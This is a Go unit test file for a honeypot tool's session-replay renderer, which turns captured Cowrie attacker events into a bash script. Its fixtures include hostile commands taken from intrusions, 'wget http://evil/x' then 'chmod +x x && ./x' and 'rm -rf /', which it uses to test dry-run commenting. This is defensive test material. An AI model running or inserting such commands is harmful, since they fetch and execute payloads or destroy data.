package replay

import (
	"strings"
	"testing"
	"time"

	"github.com/networkshard/shardlure/pkg/models"
)

func TestRenderBasic(t *testing.T) {
	t0 := time.Date(2026, 5, 22, 10, 0, 0, 0, time.UTC)
	events := []*models.Event{
		{TS: t0, Source: models.SourceCowrie, Kind: models.KindFailedPass, Username: "root", ActorID: "a"},
		{TS: t0.Add(2 * time.Second), Kind: models.KindCommand, Command: "uname -a", SrcIP: "1.2.3.4", Username: "root", ActorID: "a"},
		{TS: t0.Add(5 * time.Second), Kind: models.KindCommand, Command: "wget http://evil/x"},
		{TS: t0.Add(8 * time.Second), Kind: models.KindCommand, Command: "chmod +x x && ./x"},
	}
	s := Render("sess-1", events, Options{IncludeSleeps: true})
	if !strings.Contains(s, "#!/usr/bin/env bash") {
		t.Errorf("missing shebang")
	}
	if !strings.Contains(s, "# session: sess-1") {
		t.Errorf("missing session id")
	}
	if !strings.Contains(s, "uname -a") {
		t.Errorf("missing first command")
	}
	if !strings.Contains(s, "sleep 3.0") {
		t.Errorf("missing 3s sleep between cmd 1 and cmd 2: %s", s)
	}
	if !strings.Contains(s, "# T+3s") {
		t.Errorf("missing offset comment")
	}
}

func TestRenderDryRun(t *testing.T) {
	t0 := time.Now()
	events := []*models.Event{
		{TS: t0, Kind: models.KindCommand, Command: "rm -rf /"},
	}
	s := Render("s", events, Options{DryRun: true})
	if !strings.Contains(s, "# rm -rf /") {
		t.Errorf("DryRun should comment commands: %s", s)
	}
	if strings.Contains(s, "\nrm -rf /\n") {
		t.Errorf("DryRun should not emit raw command")
	}
}

func TestRenderEmpty(t *testing.T) {
	s := Render("empty", []*models.Event{}, Options{})
	if !strings.Contains(s, "no command events captured") {
		t.Errorf("expected empty-session note")
	}
}

func TestSleepCap(t *testing.T) {
	t0 := time.Now()
	events := []*models.Event{
		{TS: t0, Kind: models.KindCommand, Command: "a"},
		{TS: t0.Add(2 * time.Hour), Kind: models.KindCommand, Command: "b"},
	}
	s := Render("s", events, Options{IncludeSleeps: true})
	if !strings.Contains(s, "sleep 5.0") {
		t.Errorf("expected sleep clamped to MaxSleep=5s, got: %s", s)
	}
}
